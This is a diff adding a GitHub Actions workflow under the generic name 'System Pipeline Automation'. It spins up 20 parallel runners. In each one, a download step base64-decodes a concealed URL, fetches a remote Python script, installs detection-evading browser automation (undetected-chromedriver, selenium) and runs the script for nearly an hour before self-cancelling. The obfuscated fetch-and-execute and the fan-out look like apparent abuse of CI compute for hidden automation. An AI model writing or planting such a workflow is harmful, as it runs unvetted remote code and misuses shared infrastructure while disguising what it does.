@@ -1,0 +1,88 @@
+name: System Pipeline Automation
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: process-flow-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Timeout Monitor: مراقبة وإنهاء الجلسة بعد 59 دقيقة
+  # =================================================================
+  timeout-monitor:
+    name: "Timeout Controller"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      HALT_DELAY: 3540
+    steps:
+      - name: Await Expiration Window
+        run: |
+          echo "Monitor initiated for run ID: ${{ github.run_id }}"
+          
+          sleep "${HALT_DELAY}"
+
+          echo "Maximum duration reached. Sending cancel request..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+  # =================================================================
+  # Parallel Workers: تشغيل العقد بالتوازي
+  # =================================================================
+  parallel-workers:
+    name: "Worker-Slot-${{ matrix.slot_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        slot_id: [801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820]
+
+    steps:
+      # -----------------------------------------------------------------
+      # 1. تثبيت أدوات النظام الأساسية
+      # -----------------------------------------------------------------
+      - name: Install Base Packages
+        run: |
+          sudo apt update -y
+          sudo apt install -y curl python3-pip
+
+      # -----------------------------------------------------------------
+      # 2. تنزيل السكريبت التنفيذي
+      # -----------------------------------------------------------------
+      - name: Download Execution Script
+        run: |
+          SCRIPT_SRC=$(openssl base64 -d -A <<< "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5")
+          curl -sL "$SCRIPT_SRC" -o main_task.py
+
+      # -----------------------------------------------------------------
+      # 3. تثبيت الاعتمادات المطلوبة
+      # -----------------------------------------------------------------
+      - name: Install Required Packages
+        run: |
+          pip install --no-cache-dir undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # 4. تشغيل ومراقبة العملية
+      # -----------------------------------------------------------------
+      - name: Execute Main Task
+        run: |
+          python3 main_task.py &
+          SUB_PID=$!
+
+          sleep 3540
+
+          if kill -0 "$SUB_PID" 2>/dev/null; then
+            kill -9 "$SUB_PID"
+          fi
